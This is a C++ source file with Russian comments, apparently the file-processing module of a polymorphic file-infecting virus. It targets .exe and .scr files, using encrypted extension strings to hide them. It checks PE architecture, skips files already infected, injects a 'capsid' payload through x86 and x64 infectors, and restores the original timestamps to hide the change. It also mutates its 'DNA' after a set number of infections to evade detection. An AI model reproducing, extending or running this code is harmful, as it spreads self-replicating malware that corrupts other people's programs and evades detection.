#include "preprocessing.hpp"
#include "infector.hpp"
#include "utils.hpp"
#include "strings.hpp"

// проверяет является ли расширение нашего имени файла заражаемым
BOOL isOurTarget(PWCHAR pwFileName)
{
	if (pwFileName == nullptr)
		return FALSE;

	UINT uLen = wcslen(pwFileName);
	if (uLen == 0)
		return FALSE;

	PWCHAR pwFileEnd = &pwFileName[uLen];
	while (pwFileEnd != pwFileName)
	{
		if (*pwFileEnd == L'.')
			break;

		pwFileEnd--;
	}
	// нет расширения
	if (pwFileEnd == pwFileName)
		return FALSE;
	// значение после точки
	pwFileEnd++;
	// имя файла заканчивается на точку file. 
	if (*pwFileEnd == L'\0')
		return FALSE;

	CCryptString cExeStr(cryptedstr_exe);
	CCryptString cScrStr(cryptedstr_scr);

	PWCHAR pwFileExtensions[2];
	pwFileExtensions[0] = cExeStr.w_str();
	pwFileExtensions[1] = cScrStr.w_str();

	for (UINT i = 0; i < sizeof(pwFileExtensions) / sizeof(PWCHAR); i++)
	{
		// если расширение совпадает - выходим
		if (!lstrcmpiW(pwFileEnd, pwFileExtensions[i]))
			return TRUE;
	}

	return FALSE;
}

DWORD CALLBACK preprocessing::ProcessFile(PWCHAR pwFilePath, PWIN32_FIND_DATAW pfnd, LPBYTE lpParameter, SIZE_T dwParameterSize)
{
	if ((lpParameter == nullptr) || (dwParameterSize != sizeof(capsidProcessingForm)))
		return 0;

	if (!isOurTarget(pfnd->cFileName))
		return 0;

#ifdef _DEBUG
	WCHAR debugOut[1024];
	WriteLog(L"[preprocessing::ProcessFile] Preprocessing file: ", pwFilePath);
#endif

	capsidProcessingForm *cpf = (capsidProcessingForm*)lpParameter;

	// инстанс нужного инфектора
	IInfector *infector = nullptr;
	// инстанс мутатора ДНК
	IDNAProcessor *dna = nullptr;
	
	DWORD dwRet = -1;

	HANDLE hFile = INVALID_HANDLE_VALUE;
	LPBYTE lpTmpBase = nullptr; // временный поинтер указывающий на буфер, нужен чтобы проанализировать файл до передачи в инфектор
	LARGE_INTEGER liFileSize;
	LARGE_INTEGER liMoveDistance;
	FILETIME ftCreationTime;
	FILETIME ftLastAccessTime;
	FILETIME ftLastWriteTime;
	BOOL bAccessTimeRetrieved = FALSE;

	RtlSecureZeroMemory(&ftCreationTime, sizeof(ftCreationTime));
	RtlSecureZeroMemory(&ftLastAccessTime, sizeof(ftLastAccessTime));
	RtlSecureZeroMemory(&ftLastWriteTime, sizeof(ftLastWriteTime));
	RtlSecureZeroMemory(&liFileSize, sizeof(liFileSize));
	RtlSecureZeroMemory(&liMoveDistance, sizeof(liMoveDistance));
	do
	{
		hFile = CreateFileW(pwFilePath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
#ifdef _DEBUG
			WriteLog(L"[preprocessing::ProcessFile] error opening file: ", pwFilePath);
#endif
			// TODO: сделать проверку ошибки и если файл попросту занят, то скопировать его рядом, заразить и MoveFileEx переместить после ребута заместо занятого
			// UPD: не требуется, так как в таком случае после ребута с админ правами он итак заразится из службы
			break;
		}
		// файл был открыт, произвести заражение

		if (!GetFileSizeEx(hFile, &liFileSize))
		{
#ifdef _DEBUG
			WriteLog(L"[preprocessing::ProcessFile] error getting file size: ", pwFilePath);
#endif
			break;
		}

		// на данный момент не тестил как заражаются файлы > 4 ГБ, поэтому пока пропустим
		if (liFileSize.HighPart != 0)
		{
#ifdef _DEBUG
			WriteLog(L"[preprocessing::ProcessFile] file is too big, currently unsupported ", pwFilePath);
#endif
			break;
		}

		DWORD readSize = (DWORD)liFileSize.QuadPart;
		if (liFileSize.QuadPart > (LONGLONG)(10 * 1024))
			readSize = 10 * 1024; // если файл больше 10 кб, то временно прочитаем только 10 кб, этого должно быть досточно иначе сразу весь файл
		DWORD dwRead;

		lpTmpBase = new BYTE[readSize + 1];
		if (lpTmpBase == nullptr)
			break;

		if (!ReadFile(hFile, lpTmpBase, readSize, &dwRead, NULL))
		{
#ifdef _DEBUG
			WriteLog(L"[preprocessing::ProcessFile] cant read from file ", pwFilePath);
#endif
			break;
		}

		// проверим архитектуру и валидность файла
		DWORD dwArch = dwGetFileArchitecture((PIMAGE_DOS_HEADER)lpTmpBase);
		if ((dwArch != IMAGE_FILE_MACHINE_I386) && (dwArch != IMAGE_FILE_MACHINE_AMD64))
		{
#ifdef _DEBUG
			WriteLog(L"[preprocessing::ProcessFile] invalid file ", pwFilePath);
#endif
			break;
		}

#ifndef _FNO_FLAGS_USEHEURISTICS
		if (isInfected((PIMAGE_DOS_HEADER)lpTmpBase, dwArch))
		{
#ifdef _DEBUG
			WriteLog(L"[preprocessing::ProcessFile] file has been already infected ", pwFilePath);
#endif
			break;
		}
#endif

		switch (dwArch)
		{
		case IMAGE_FILE_MACHINE_I386:
			infector = (IInfector*)new x86exe_infector;
			break;
		case IMAGE_FILE_MACHINE_AMD64:
			infector = (IInfector*)new x64exe_infector;
			break;
		}

		RtlSecureZeroMemory(&liMoveDistance, sizeof(liMoveDistance));
		SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN);

		if (infector == nullptr)
			break;

		dna = (IDNAProcessor*)new DefaultDNAProcessor;
		if (dna == nullptr)
			break;

		if (!dna->init((LPBYTE)cpf->capsid, cpf->capsid->size))
		{
#ifdef _DEBUG
			WriteLog(L"[preprocessing::ProcessFile] error cant initialize DNA processor");
#endif
			break;
		}

		bAccessTimeRetrieved = GetFileTime(hFile, &ftCreationTime, &ftLastAccessTime, &ftLastWriteTime);

		if (!infector->process_file(hFile, cpf->capsid, NULL, dna))
		{
#ifdef _DEBUG
			WriteLog(L"[preprocessing::ProcessFile] error infecting file ", pwFilePath);
#endif
			break;
		}

		if (bAccessTimeRetrieved)
			SetFileTime(hFile, &ftCreationTime, &ftLastAccessTime, &ftLastWriteTime);

		cpf->uInfectedSinceMutation++;
		cpf->uTotalInfected++;

		if (dna->mutate(cpf->uInfectedSinceMutation))
		{
#ifdef _DEBUG
			WriteLog(L"[preprocessing::ProcessFile] capsid has mutated");
#endif
			cpf->uInfectedSinceMutation = 0;
			dna->update();
		}

#ifdef _DEBUG
		wsprintfW(debugOut, L"[preprocessing::ProcessFile] total infected %ld, since last mutation %ld", cpf->uTotalInfected, cpf->uInfectedSinceMutation);
		WriteLog(debugOut);
#endif

		dwRet = ERROR_SUCCESS;

	} while (FALSE);

	if (infector != nullptr)
		delete infector;

	if (dna != nullptr)
		delete dna;

	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	if (lpTmpBase != nullptr)
		delete[]lpTmpBase;

	return dwRet;
}
